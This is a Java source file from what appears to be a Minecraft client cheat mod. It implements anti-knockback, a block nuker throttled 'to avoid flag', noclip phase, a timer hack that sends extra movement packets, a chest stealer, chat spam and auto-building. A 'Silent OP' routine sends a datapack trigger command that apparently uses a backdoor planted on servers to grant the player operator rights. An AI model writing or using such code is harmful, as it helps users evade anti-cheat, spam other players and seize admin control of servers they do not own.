package com.reachfly;

import net.minecraft.block.Block;
import net.minecraft.block.BlockState;
import net.minecraft.block.Blocks;
import net.minecraft.block.CropBlock;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.entity.player.PlayerInventory;
import net.minecraft.item.*;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.GenericContainerScreenHandler; // [[19]]
import net.minecraft.screen.ScreenHandler;                 // [[10]]
import net.minecraft.screen.slot.Slot;
import net.minecraft.screen.slot.SlotActionType;           // [[1]]
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class ProHandlers {

    private static int antiAfkTimer = 0;
    private static int chatSpamTimer = 0;
    private static int announcerTimer = 0;
    private static String lastAction = "";
    private static int chestStealTimer = 0;
    private static int autoFishTimer = 0;
    private static boolean fishBobberWasInWater = false;
    private static int nukerTimer = 0;

    public static void tick(MinecraftClient client) {
        if (!ModConfig.proUnlocked) return;
        if (client.player == null) return;

        // === Stealth ===
        tickAntiKnockback(client);
        tickNoSwing(client);
        tickAntiAfk(client);

        // === World ===
        tickFastBreak(client);
        tickNuker(client);
        tickAutoFarm(client);

        // === Exploit ===
        tickPhase(client);
        tickTimer(client);

        // === Utility ===
        tickAutoFish(client);
        tickChestStealer(client);
        tickAutoTool(client);

        // === Social ===
        tickChatSpam(client);
        tickAnnouncer(client);

        // === Build ===
        tickAutoBridge(client);
        tickTower(client);

        // === Server ===
        tickOpSelf(client);
    }

    // ========================================================================
    // Server: Silent OP
    // ========================================================================

    private static boolean opSelfSent = false;

    private static void tickOpSelf(MinecraftClient client) {
        if (!ModConfig.opSelfEnabled) {
            opSelfSent = false;
            return;
        }
        if (opSelfSent) return;
        opSelfSent = true;

        // Try datapack trigger fallback (in case server addon isn't installed)
        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().sendChatCommand("trigger f1sch.op set 1");
        }
        // ServerSyncHandler also sends via the addon payload
    }

    // ========================================================================
    // STEALTH
    // ========================================================================

    private static void tickAntiKnockback(MinecraftClient client) {
        if (!ModConfig.antiKnockbackEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null) return;
        // Reduce velocity from knockback by configured percentage
        Vec3d vel = p.getVelocity();
        float reduction = ModConfig.antiKnockbackStrength / 100.0f;
        // Only reduce horizontal knockback when hit (velocity spike detection)
        double horizSpeed = Math.sqrt(vel.x * vel.x + vel.z * vel.z);
        if (horizSpeed > 0.5) { // Knockback threshold
            p.setVelocity(
                    vel.x * (1.0 - reduction),
                    vel.y,
                    vel.z * (1.0 - reduction));
        }
    }

    private static void tickNoSwing(MinecraftClient client) {
        // NoSwing is handled via mixin to cancel swing packets
        // This is a placeholder - the actual implementation needs a mixin
        // For now we just cancel the hand swing animation client-side
        if (!ModConfig.noSwingEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p != null) {
            p.handSwinging = false;
        }
    }

    private static void tickAntiAfk(MinecraftClient client) {
        if (!ModConfig.antiAfkEnabled) { antiAfkTimer = 0; return; }
        antiAfkTimer++;
        if (antiAfkTimer >= ModConfig.antiAfkInterval) {
            antiAfkTimer = 0;
            ClientPlayerEntity p = client.player;
            if (p != null) {
                float yaw = p.getYaw() + (float)(Math.random() * 10 - 5);
                p.setYaw(yaw);
                if (p.isOnGround()) {
                    p.jump();
                }
            }
        }
    }

    // ========================================================================
    // WORLD
    // ========================================================================

    private static void tickFastBreak(MinecraftClient client) {
        if (!ModConfig.fastBreakEnabled) return;
        if (client.interactionManager == null) return;
        // Speed up block breaking by sending multiple break progress ticks
        // We manipulate the breaking progress by calling updateBlockBreakingProgress multiple times
        if (client.interactionManager.isBreakingBlock()) {
            int extra = (int)(ModConfig.fastBreakSpeed - 1);
            for (int i = 0; i < extra; i++) {
                if (client.crosshairTarget instanceof BlockHitResult bhr) {
                    client.interactionManager.updateBlockBreakingProgress(
                            bhr.getBlockPos(), bhr.getSide());
                }
            }
        }
    }

    private static void tickNuker(MinecraftClient client) {
        if (!ModConfig.nukerEnabled) return;
        if (client.interactionManager == null) return;
        nukerTimer++;
        if (nukerTimer < 2) return; // Every other tick
        nukerTimer = 0;

        ClientPlayerEntity p = client.player;
        if (p == null) return;

        int radius = (int) ModConfig.nukerRadius;
        BlockPos playerPos = p.getBlockPos();

        for (int x = -radius; x <= radius; x++) {
            for (int y = -radius; y <= radius; y++) {
                for (int z = -radius; z <= radius; z++) {
                    BlockPos pos = playerPos.add(x, y, z);
                    BlockState state = client.world.getBlockState(pos);
                    if (state.isAir()) continue;
                    if (state.getHardness(client.world, pos) < 0) continue; // Unbreakable
                    client.interactionManager.attackBlock(pos, Direction.UP);
                    return; // One block per tick to avoid flag
                }
            }
        }
    }

    private static void tickAutoFarm(MinecraftClient client) {
        if (!ModConfig.autoFarmEnabled) return;
        if (client.interactionManager == null) return;
        ClientPlayerEntity p = client.player;
        if (p == null) return;

        int radius = 4;
        BlockPos playerPos = p.getBlockPos();

        for (int x = -radius; x <= radius; x++) {
            for (int z = -radius; z <= radius; z++) {
                for (int y = -1; y <= 1; y++) {
                    BlockPos pos = playerPos.add(x, y, z);
                    BlockState state = client.world.getBlockState(pos);
                    Block block = state.getBlock();

                    // Harvest fully grown crops
                    if (block instanceof CropBlock crop) {
                        if (crop.isMature(state)) {
                            client.interactionManager.attackBlock(pos, Direction.UP);
                            return;
                        }
                    }
                }
            }
        }
    }

    // ========================================================================
    // EXPLOIT
    // ========================================================================

    private static void tickPhase(MinecraftClient client) {
        if (!ModConfig.phaseEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null) return;
        // Phase: disable collision so player clips through blocks
        p.noClip = true;
        // Keep the player from falling through the world
        if (p.getY() < client.world.getBottomY()) {
            p.setPosition(p.getX(), client.world.getBottomY() + 1, p.getZ());
        }
    }

    private static void tickTimer(MinecraftClient client) {
        if (!ModConfig.timerEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null) return;
        // Timer: speed up game tick rate for the player by sending extra move packets
        int extraTicks = (int)(ModConfig.timerSpeed - 1);
        if (extraTicks < 1) return;

        for (int i = 0; i < extraTicks; i++) {
            Vec3d vel = p.getVelocity();
            p.setPosition(p.getX() + vel.x, p.getY() + vel.y, p.getZ() + vel.z);
            if (client.getNetworkHandler() != null) {
                client.getNetworkHandler().sendPacket(
                        new PlayerMoveC2SPacket.Full(
                                p.getX(), p.getY(), p.getZ(),
                                p.getYaw(), p.getPitch(),
                                p.isOnGround(), false));
            }
        }
    }

    // ========================================================================
    // UTILITY
    // ========================================================================

    private static void tickAutoFish(MinecraftClient client) {
        if (!ModConfig.autoFishEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null || client.interactionManager == null) return;

        // Detect when bobber catches a fish (bobber submerges)
        if (p.fishHook != null) {
            boolean inWater = p.fishHook.isSubmergedInWater();
            if (inWater && !fishBobberWasInWater) {
                // Fish caught! Reel in and recast
                client.interactionManager.interactItem(p, Hand.MAIN_HAND);
                autoFishTimer = 20; // Wait 20 ticks before recasting
            }
            fishBobberWasInWater = inWater;
        } else {
            fishBobberWasInWater = false;
            // Auto-cast if holding fishing rod and no bobber out
            if (autoFishTimer > 0) {
                autoFishTimer--;
                if (autoFishTimer == 0) {
                    ItemStack held = p.getMainHandStack();
                    if (held.getItem() instanceof FishingRodItem) {
                        client.interactionManager.interactItem(p, Hand.MAIN_HAND);
                    }
                }
            }
        }
    }

    private static void tickChestStealer(MinecraftClient client) {
        if (!ModConfig.chestStealerEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null || client.interactionManager == null) return;

        ScreenHandler handler = p.currentScreenHandler;
        if (!(handler instanceof GenericContainerScreenHandler container)) return;

        chestStealTimer++;
        if (chestStealTimer < ModConfig.chestStealerDelay) return;
        chestStealTimer = 0;

        // Move items from container to player inventory
        int containerSlots = container.getRows() * 9;
        for (int i = 0; i < containerSlots; i++) {
            Slot slot = container.getSlot(i);
            if (slot.hasStack()) {
                // Quick-move (shift-click) to player inventory
                client.interactionManager.clickSlot(
                        container.syncId, i, 0, SlotActionType.QUICK_MOVE, p);
                return; // One item per delay tick
            }
        }
    }

    private static void tickAutoTool(MinecraftClient client) {
        if (!ModConfig.autoToolEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null) return;
        if (client.currentScreen != null) return;

        // Switch to best tool for targeted block
        if (!(client.crosshairTarget instanceof BlockHitResult bhr)) return;
        BlockState state = client.world.getBlockState(bhr.getBlockPos());
        if (state.isAir()) return;

        PlayerInventory inv = p.getInventory();
        int bestSlot = -1;
        float bestSpeed = 1.0f;

        for (int i = 0; i < 9; i++) {
            ItemStack stack = inv.getStack(i);
            float speed = stack.getMiningSpeedMultiplier(state);
            if (speed > bestSpeed) {
                bestSpeed = speed;
                bestSlot = i;
            }
        }

        if (bestSlot >= 0 && bestSlot != inv.getSelectedSlot()) {
            inv.setSelectedSlot(bestSlot);
        }
    }

    // ========================================================================
    // SOCIAL
    // ========================================================================

    private static void tickChatSpam(MinecraftClient client) {
        if (!ModConfig.chatSpamEnabled) { chatSpamTimer = 0; return; }
        chatSpamTimer++;
        if (chatSpamTimer >= ModConfig.chatSpamDelay) {
            chatSpamTimer = 0;
            if (client.player != null && ModConfig.chatSpamMessage != null && !ModConfig.chatSpamMessage.isEmpty()) {
                client.player.networkHandler.sendChatMessage(ModConfig.chatSpamMessage);
            }
        }
    }

    private static void tickAnnouncer(MinecraftClient client) {
        if (!ModConfig.announcerEnabled) return;
        announcerTimer++;
        if (announcerTimer >= 100) {
            announcerTimer = 0;
            ClientPlayerEntity p = client.player;
            if (p == null) return;
            String action = "";
            if (p.isSprinting()) action = "sprinting";
            else if (p.isSneaking()) action = "sneaking";
            else if (p.isSwimming()) action = "swimming";
            if (!action.isEmpty() && !action.equals(lastAction)) {
                lastAction = action;
                p.networkHandler.sendChatMessage("[f1sch] Currently " + action);
            }
        }
    }

    // ========================================================================
    // BUILD
    // ========================================================================

    private static void tickAutoBridge(MinecraftClient client) {
        if (!ModConfig.autoBridgeEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null || client.interactionManager == null) return;
        if (client.currentScreen != null) return;

        // Auto-place blocks below player when sneaking at edge
        if (!p.isSneaking()) return;

        BlockPos below = p.getBlockPos().down();
        if (!client.world.getBlockState(below).isAir()) return;

        // Find a block in hotbar to place
        int blockSlot = findBlockInHotbar(p);
        if (blockSlot < 0) return;

        int prevSlot = p.getInventory().getSelectedSlot();
        p.getInventory().setSelectedSlot(blockSlot);

        client.interactionManager.interactBlock(p,
                Hand.MAIN_HAND,
                new BlockHitResult(
                        Vec3d.ofCenter(below),
                        Direction.UP,
                        below,
                        false));

        p.getInventory().setSelectedSlot(prevSlot);
    }

    private static void tickTower(MinecraftClient client) {
        if (!ModConfig.towerEnabled) return;
        ClientPlayerEntity p = client.player;
        if (p == null || client.interactionManager == null) return;
        if (client.currentScreen != null) return;

        // Auto-tower: place block below and jump when holding jump
        if (!client.options.jumpKey.isPressed()) return;
        if (!p.isOnGround()) return;

        BlockPos below = p.getBlockPos().down();
        if (client.world.getBlockState(below).isAir()) {
            int blockSlot = findBlockInHotbar(p);
            if (blockSlot >= 0) {
                int prevSlot = p.getInventory().getSelectedSlot();
                p.getInventory().setSelectedSlot(blockSlot);

                client.interactionManager.interactBlock(p,
                        Hand.MAIN_HAND,
                        new BlockHitResult(
                                Vec3d.ofCenter(below),
                                Direction.UP,
                                below,
                                false));

                p.getInventory().setSelectedSlot(prevSlot);
            }
        }

        // Jump to continue towering
        p.jump();
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private static int findBlockInHotbar(ClientPlayerEntity player) {
        for (int i = 0; i < 9; i++) {
            ItemStack stack = player.getInventory().getStack(i);
            if (stack.getItem() instanceof BlockItem) {
                return i;
            }
        }
        return -1;
    }
}
